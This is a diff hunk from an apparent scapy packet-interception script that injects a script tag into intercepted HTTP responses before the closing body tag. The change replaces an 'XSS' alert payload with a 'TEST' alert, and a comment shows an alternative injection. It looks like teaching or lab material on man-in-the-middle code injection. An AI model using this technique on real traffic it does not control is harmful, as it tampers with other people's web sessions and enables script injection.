@@ -23,7 +23,7 @@ def process_packet(packet):
 
         elif scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            injected_payload = "<script>alert('XSS');</script>"
+            injected_payload = "<script>alert('TEST');</script>"
             load = load.replace(b"</body>", injected_payload.encode() + b"</body>")             # OR we can use --> modified_load = re.sub(b"</body>", b"<script>alert('NOTE');</script></body>", scapy_packet[scapy.Raw].load)
             content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
             if content_length_search and b"text/html" in load:
